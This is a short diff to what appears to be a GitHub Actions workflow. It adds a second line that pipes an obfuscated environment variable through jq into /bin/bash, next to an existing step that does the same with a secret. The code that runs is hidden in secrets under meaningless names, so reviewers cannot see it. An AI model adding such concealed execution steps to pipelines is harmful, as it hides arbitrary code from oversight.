@@ -20,6 +20,7 @@ jobs:
           szm0: ${{ secrets.szm0 }}
         run: |
           printf '%s' "$szm0" | jq -r .un078 | /bin/bash
+          echo $ymhlt11 | jq -r .vn55219 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
